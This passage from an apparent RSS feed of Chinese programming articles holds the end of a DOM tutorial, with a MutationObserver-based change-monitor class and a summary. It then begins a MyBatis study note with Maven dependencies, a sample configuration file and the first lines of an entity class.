      <span class="hljs-attr">added</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(),
      <span class="hljs-attr">removed</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(),
      <span class="hljs-attr">attributeChanged</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(),
      <span class="hljs-attr">textChanged</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isObserving</span> = <span class="hljs-literal">false</span>;
  }
  
  <span class="hljs-comment">// 开始监控</span>
  <span class="hljs-title function_">observe</span>(<span class="hljs-params">target = <span class="hljs-variable language_">document</span>.documentElement</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isObserving</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">disconnect</span>();
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">observe</span>(target, <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isObserving</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">// 停止监控</span>
  <span class="hljs-title function_">disconnect</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">disconnect</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isObserving</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">// 处理变化</span>
  <span class="hljs-title function_">handleMutations</span>(<span class="hljs-params">mutations</span>) {
    mutations.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">mutation</span> =&gt;</span> {
      <span class="hljs-keyword">switch</span> (mutation.<span class="hljs-property">type</span>) {
        <span class="hljs-keyword">case</span> <span class="hljs-string">'childList'</span>:
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleChildListMutation</span>(mutation);
          <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-string">'attributes'</span>:
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleAttributeMutation</span>(mutation);
          <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-string">'characterData'</span>:
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleCharacterDataMutation</span>(mutation);
          <span class="hljs-keyword">break</span>;
      }
    });
  }
  
  <span class="hljs-comment">// 处理子节点变化</span>
  <span class="hljs-title function_">handleChildListMutation</span>(<span class="hljs-params">mutation</span>) {
    <span class="hljs-comment">// 新增节点</span>
    mutation.<span class="hljs-property">addedNodes</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">node</span> =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-property">added</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> {
        <span class="hljs-title function_">callback</span>(node, mutation.<span class="hljs-property">target</span>);
      });
    });
    
    <span class="hljs-comment">// 移除节点</span>
    mutation.<span class="hljs-property">removedNodes</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">node</span> =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-property">removed</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> {
        <span class="hljs-title function_">callback</span>(node, mutation.<span class="hljs-property">target</span>);
      });
    });
  }
  
  <span class="hljs-comment">// 处理属性变化</span>
  <span class="hljs-title function_">handleAttributeMutation</span>(<span class="hljs-params">mutation</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-property">attributeChanged</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> {
      <span class="hljs-title function_">callback</span>({
        <span class="hljs-attr">target</span>: mutation.<span class="hljs-property">target</span>,
        <span class="hljs-attr">attributeName</span>: mutation.<span class="hljs-property">attributeName</span>,
        <span class="hljs-attr">oldValue</span>: mutation.<span class="hljs-property">oldValue</span>,
        <span class="hljs-attr">newValue</span>: mutation.<span class="hljs-property">target</span>.<span class="hljs-title function_">getAttribute</span>(mutation.<span class="hljs-property">attributeName</span>)
      });
    });
  }
  
  <span class="hljs-comment">// 处理文本变化</span>
  <span class="hljs-title function_">handleCharacterDataMutation</span>(<span class="hljs-params">mutation</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-property">textChanged</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> {
      <span class="hljs-title function_">callback</span>({
        <span class="hljs-attr">target</span>: mutation.<span class="hljs-property">target</span>,
        <span class="hljs-attr">oldValue</span>: mutation.<span class="hljs-property">oldValue</span>,
        <span class="hljs-attr">newValue</span>: mutation.<span class="hljs-property">target</span>.<span class="hljs-property">textContent</span>
      });
    });
  }
  
  <span class="hljs-comment">// 注册回调</span>
  <span class="hljs-title function_">on</span>(<span class="hljs-params">event, callback</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>[event]) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>[event].<span class="hljs-title function_">add</span>(callback);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-title function_">off</span>(<span class="hljs-params">event, callback</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>[event]) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>[event].<span class="hljs-title function_">delete</span>(callback);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">// 一次性监控</span>
  <span class="hljs-title function_">once</span>(<span class="hljs-params">event, callback</span>) {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">wrapper</span> = (<span class="hljs-params">...args</span>) =&gt; {
      <span class="hljs-title function_">callback</span>(...args);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">off</span>(event, wrapper);
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(event, wrapper);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">// 获取快照</span>
  <span class="hljs-title function_">takeSnapshot</span>(<span class="hljs-params">target = <span class="hljs-variable language_">document</span>.documentElement</span>) {
    <span class="hljs-keyword">const</span> snapshot = {
      <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
      <span class="hljs-attr">html</span>: target.<span class="hljs-property">outerHTML</span>,
      <span class="hljs-attr">children</span>: <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(target.<span class="hljs-property">children</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> ({
        <span class="hljs-attr">tagName</span>: child.<span class="hljs-property">tagName</span>,
        <span class="hljs-attr">attributes</span>: <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(child.<span class="hljs-property">attributes</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, attr</span>) =&gt;</span> {
          acc[attr.<span class="hljs-property">name</span>] = attr.<span class="hljs-property">value</span>;
          <span class="hljs-keyword">return</span> acc;
        }, {}),
        <span class="hljs-attr">childrenCount</span>: child.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>
      }))
    };
    
    <span class="hljs-keyword">return</span> snapshot;
  }
  
  <span class="hljs-comment">// 比较快照</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">compareSnapshots</span>(<span class="hljs-params">snapshot1, snapshot2</span>) {
    <span class="hljs-keyword">const</span> differences = [];
    
    <span class="hljs-comment">// 比较HTML</span>
    <span class="hljs-keyword">if</span> (snapshot1.<span class="hljs-property">html</span> !== snapshot2.<span class="hljs-property">html</span>) {
      differences.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'html'</span>,
        <span class="hljs-attr">before</span>: snapshot1.<span class="hljs-property">html</span>,
        <span class="hljs-attr">after</span>: snapshot2.<span class="hljs-property">html</span>
      });
    }
    
    <span class="hljs-comment">// 比较子节点数量</span>
    <span class="hljs-keyword">if</span> (snapshot1.<span class="hljs-property">children</span>.<span class="hljs-property">length</span> !== snapshot2.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>) {
      differences.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'childrenCount'</span>,
        <span class="hljs-attr">before</span>: snapshot1.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>,
        <span class="hljs-attr">after</span>: snapshot2.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>
      });
    }
    
    <span class="hljs-comment">// 比较子节点属性</span>
    <span class="hljs-keyword">const</span> maxLength = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(snapshot1.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>, snapshot2.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; maxLength; i++) {
      <span class="hljs-keyword">const</span> child1 = snapshot1.<span class="hljs-property">children</span>[i];
      <span class="hljs-keyword">const</span> child2 = snapshot2.<span class="hljs-property">children</span>[i];
      
      <span class="hljs-keyword">if</span> (!child1 &amp;&amp; child2) {
        differences.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">'childAdded'</span>,
          <span class="hljs-attr">index</span>: i,
          <span class="hljs-attr">child</span>: child2
        });
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (child1 &amp;&amp; !child2) {
        differences.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">'childRemoved'</span>,
          <span class="hljs-attr">index</span>: i,
          <span class="hljs-attr">child</span>: child1
        });
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (child1 &amp;&amp; child2) {
        <span class="hljs-comment">// 比较标签名</span>
        <span class="hljs-keyword">if</span> (child1.<span class="hljs-property">tagName</span> !== child2.<span class="hljs-property">tagName</span>) {
          differences.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">'tagNameChanged'</span>,
            <span class="hljs-attr">index</span>: i,
            <span class="hljs-attr">before</span>: child1.<span class="hljs-property">tagName</span>,
            <span class="hljs-attr">after</span>: child2.<span class="hljs-property">tagName</span>
          });
        }
        
        <span class="hljs-comment">// 比较属性</span>
        <span class="hljs-keyword">const</span> allAttrs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([
          ...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(child1.<span class="hljs-property">attributes</span>),
          ...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(child2.<span class="hljs-property">attributes</span>)
        ]);
        
        allAttrs.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">attr</span> =&gt;</span> {
          <span class="hljs-keyword">const</span> val1 = child1.<span class="hljs-property">attributes</span>[attr];
          <span class="hljs-keyword">const</span> val2 = child2.<span class="hljs-property">attributes</span>[attr];
          
          <span class="hljs-keyword">if</span> (val1 !== val2) {
            differences.<span class="hljs-title function_">push</span>({
              <span class="hljs-attr">type</span>: <span class="hljs-string">'attributeChanged'</span>,
              <span class="hljs-attr">index</span>: i,
              <span class="hljs-attr">attribute</span>: attr,
              <span class="hljs-attr">before</span>: val1,
              <span class="hljs-attr">after</span>: val2
            });
          }
        });
      }
    }
    
    <span class="hljs-keyword">return</span> differences;
  }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DOMMonitorExample</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">setupMonitoring</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> monitor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMChangeMonitor</span>();
    
    <span class="hljs-comment">// 监控元素添加</span>
    monitor.<span class="hljs-title function_">on</span>(<span class="hljs-string">'added'</span>, <span class="hljs-function">(<span class="hljs-params">node, parent</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Node added:'</span>, node.<span class="hljs-property">nodeName</span>, <span class="hljs-string">'to'</span>, parent.<span class="hljs-property">nodeName</span>);
      
      <span class="hljs-comment">// 自动为新元素添加事件监听器</span>
      <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">ELEMENT_NODE</span>) {
        <span class="hljs-keyword">if</span> (node.<span class="hljs-title function_">matches</span>(<span class="hljs-string">'.dynamic-element'</span>)) {
          node.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Dynamic element clicked'</span>);
          });
        }
      }
    });
    
    <span class="hljs-comment">// 监控属性变化</span>
    monitor.<span class="hljs-title function_">on</span>(<span class="hljs-string">'attributeChanged'</span>, <span class="hljs-function">(<span class="hljs-params">{ target, attributeName, oldValue, newValue }</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Attribute changed: <span class="hljs-subst">${attributeName}</span>`</span>, { oldValue, newValue });
    });
    
    <span class="hljs-comment">// 开始监控整个文档</span>
    monitor.<span class="hljs-title function_">observe</span>();
    
    <span class="hljs-comment">// 获取快照</span>
    <span class="hljs-keyword">const</span> snapshot1 = monitor.<span class="hljs-title function_">takeSnapshot</span>();
    
    <span class="hljs-comment">// 做一些DOM修改</span>
    <span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
    div.<span class="hljs-property">className</span> = <span class="hljs-string">'dynamic-element'</span>;
    div.<span class="hljs-property">textContent</span> = <span class="hljs-string">'New Element'</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(div);
    
    <span class="hljs-comment">// 获取另一个快照并比较</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> snapshot2 = monitor.<span class="hljs-title function_">takeSnapshot</span>();
      <span class="hljs-keyword">const</span> diff = <span class="hljs-title class_">DOMChangeMonitor</span>.<span class="hljs-title function_">compareSnapshots</span>(snapshot1, snapshot2);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM changes:'</span>, diff);
    }, <span class="hljs-number">100</span>);
    
    <span class="hljs-keyword">return</span> monitor;
  }
}
</code></pre>
<h4 data-id="heading-19">总结</h4>
<p>DOM操作是现代Web开发的核心技能，掌握高效的DOM操作技术对于构建高性能应用至关重要。本文涵盖了：</p>
<ol>
<li><strong>DOM性能优化:</strong> 理解重排重绘、选择器优化</li>
<li><strong>虚拟DOM实现:</strong> 原理、实现和实际应用</li>
<li><strong>DOM Diff算法:</strong> 核心算法、优化策略</li>
<li><strong>事件委托:</strong> 高级模式、触摸事件处理</li>
<li><strong>自定义事件系统:</strong> 事件总线、异步事件处理</li>
<li><strong>批量DOM更新:</strong> 性能优化技巧</li>
<li><strong>DOM变化监控:</strong> MutationObserver高级用法</li>
</ol>
<p>关键要点：</p>
<ul>
<li>尽量减少直接DOM操作，使用虚拟DOM或批量更新</li>
<li>合理使用事件委托减少内存占用</li>
<li>利用浏览器API如MutationObserver监控DOM变化</li>
<li>掌握自定义事件系统实现组件通信</li>
<li>始终考虑性能影响，避免不必要的重排重绘</li>
</ul>
<p>通过本文的学习，你应该能够构建高效、可维护的DOM操作代码，为开发复杂Web应用打下坚实基础。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[学习笔记：Mybatis 示例代码，应用场景，面试题]]></title>    <link>https://juejin.cn/post/7584203412197130266</link>    <guid>https://juejin.cn/post/7584203412197130266</guid>    <pubDate>2025-12-16T07:49:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584203412197130266" data-draft-id="7584244431868968987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="学习笔记：Mybatis 示例代码，应用场景，面试题"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T07:49:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sin60"/> <meta itemprop="url" content="https://juejin.cn/user/1576027017202505"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            学习笔记：Mybatis 示例代码，应用场景，面试题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1576027017202505/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sin60
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:49:21.000Z" title="Tue Dec 16 2025 07:49:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、核心代码示例</h2>
<h3 data-id="heading-1">1. 基础环境搭建（Maven 依赖）</h3>
<p>xml</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- MyBatis 核心依赖 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-comment">&lt;!-- MySQL 驱动 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.33<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-comment">&lt;!-- Spring 整合 MyBatis（企业常用） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">2. 核心配置文件（mybatis-config.xml）</h3>
<p>xml</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span>
        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//mybatis.org//DTD Config 3.0//EN"</span>
        <span class="hljs-string">"https://mybatis.org/dtd/mybatis-3-config.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 环境配置 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">"development"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"development"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"JDBC"</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"POOLED"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"driver"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"com.mysql.cj.jdbc.Driver"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"url"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"jdbc:mysql://localhost:3306/test?useSSL=false<span class="hljs-symbol">&amp;amp;</span>serverTimezone=UTC"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"root"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>/&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 映射器配置 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">"mapper/UserMapper.xml"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">3. 实体类（User.java）</h3>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-keyword">private</span> Long id;
